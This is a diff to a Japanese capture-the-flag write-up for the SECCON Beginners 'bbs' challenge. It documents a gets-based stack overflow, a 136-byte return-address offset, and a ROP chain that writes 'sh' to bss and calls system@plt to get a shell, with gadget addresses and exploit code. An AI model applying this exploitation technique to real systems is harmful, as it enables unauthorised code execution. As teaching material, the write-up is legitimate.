@@ -66,6 +66,7 @@ Host: pwn1.chall.beginners.seccon.jp
 Port: 18373
 ```
 
+## Solution
 日付と入力したコンテンツを表示するバイナリです。
 ```
 $ ./bbs 
@@ -79,14 +80,14 @@ AAAAAAAAAAAAA
 ==============================
 ```
 
-checksecは以下のとおり、stack canaryがないためスタック・バッファオバーフローができるかもしれない。
+checksecは以下のとおり、stack canaryがない。
 ```
 $ checksec --file bbs 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
 ```
 
-このバイナリでもgetsを使っておりバッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、ripが4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
+このバイナリでもgetsを使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、ripが4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
 ```
 $ python -c 'print "A"*144'|./bbs 
 Input Content : 
@@ -114,14 +115,64 @@ gef➤  x/10xg $rsp
 gef➤  
 ```
 
-あとはROPをおこなっていく。pltセクションにsystemがあるのでこれは使える。shの文字列があるアドレスがバイナリにあれば、それをrdiにセットしてsystemをcallすればシェルと獲れる。ただgdbで見た感じバイナリには使えそうな文字列はなさそう。
+あとはROPをおこなっていく。pltセクションに`system`があるので、`system("sh")`を実行するROPチェーンを。すなわち、`sh`の文字列があるアドレスがバイナリにあれば、それをrdiにセットして`system`を呼べばシェルを獲れる。ただgdbで見た感じバイナリには`sh`文字列はなかった。
+```
+$ gdb -q bbs
+gef➤  start
+gef➤  grep sh
+[+] Searching 'sh' in memory
+[+] In '/lib/x86_64-linux-gnu/libc-2.23.so'(0x7ffff7a0d000-0x7ffff7bcd000), permission=r-x
+  0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
+```
+
+よって、まず`gets`で`sh`文字列をbssセクションに書いて、その後`system`をcallするようなROPチェーンにすればよい。
+ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
+
+* ``pop rdiガジェット
+```
+$ rp-lin-x64 -r 3 --file bbs |grep "pop rdi"
+0x00400763: pop rdi ; ret  ;  (1 found)
+```
+
+* bssセクションのアドレス
+```
+$ readelf -a bbs |grep bss
+  [26] .bss              NOBITS           0000000000601058  00001058
+   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
+    67: 0000000000601058     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
+```
+
+* `gets`と`system`のアドレス
+```
+$ objdump -M intel -d bbs |grep gets
+  4004f8:	e8 83 00 00 00       	call   400580 <gets@plt+0x10>
+0000000000400570 <gets@plt>:
+  4006c4:	e8 a7 fe ff ff       	call   400570 <gets@plt>
+kanken@kanken-VirtualBox:~/ctf/secoon_be_2018/bbs$ objdump -M intel -d bbs |grep system
+0000000000400540 <system@plt>:
+  4006d8:	e8 63 fe ff ff       	call   400540 <system@plt>
+```
+
+ROPチェーンを下記のようにしておく。
+```
+    system = 0x0000000000400540
+    gets = 0x0000000000400570
+    bss = 0x0000000000601058
+    poprdi = 0x00400763
+
+    buf = "A"*136
+    buf += p(poprdi)
+    buf += p(bss)
+    buf += p(gets)
+    buf += p(poprdi)
+    buf += p(bss)
+    buf += p(system)
+    f.write(buf+"\n")
+    f.write("sh\0\n")
 ```
 
 ```
-
-
-```
-$ python exp_bbs2.py -r
+$ python exp_bbs.py -r
 Input Content : 
 ==============================
 
